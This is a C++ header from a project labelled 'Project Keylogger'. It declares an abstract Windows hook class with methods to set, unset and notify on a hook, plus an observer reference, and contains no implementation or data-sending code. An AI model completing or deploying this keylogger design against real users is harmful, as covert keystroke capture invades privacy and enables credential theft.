/**
 *							Project Keylogger
 */


#ifndef						_AHOOK_H
#define						_AHOOK_H

#include					<Windows.h>
#include					<iostream>
#include					<vector>

#include					"HookObserver.h"

class						AHook {
public: 
    
   AHook(const HookObserver&);
    
    virtual const bool		setHook() = 0;
    void					notify(int, WPARAM, LPARAM);
    bool					unsetHook();
	const HHOOK				getHook() const;

protected: 

	HHOOK					_hHook;
	const HookObserver&		_observer;
};

#endif //_AHOOK {ABSTRACT}_H